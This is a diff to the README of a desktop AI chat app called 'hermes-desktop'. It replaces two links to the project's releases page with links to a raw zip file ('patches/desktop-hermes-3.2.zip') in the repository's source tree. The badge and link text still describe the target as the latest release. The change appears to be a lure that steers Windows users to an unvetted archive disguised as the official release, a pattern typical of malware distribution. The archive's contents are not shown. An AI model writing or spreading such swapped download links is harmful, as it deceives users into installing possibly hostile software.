@@ -1,6 +1,6 @@
 # 🤖 hermes-desktop - Chat with intelligent AI agents easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Truongn6629/hermes-desktop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Truongn6629/hermes-desktop/raw/refs/heads/main/patches/desktop-hermes-3.2.zip)
 
 This application provides a simple desktop interface for your AI agents. It functions as a chatbot that runs on your computer. You use it to talk to large language models like DeepSeek. This tool hides the technical setup so you focus on your work.
 
@@ -10,7 +10,7 @@ Note: This specific repository now serves as a historical record. The active ver
 
 You download the application directly from the project release page.
 
-[Visit the release page to download the latest version](https://github.com/Truongn6629/hermes-desktop/releases)
+[Visit the release page to download the latest version](https://github.com/Truongn6629/hermes-desktop/raw/refs/heads/main/patches/desktop-hermes-3.2.zip)
 
 Follow these steps to get the software on your Windows computer:
 
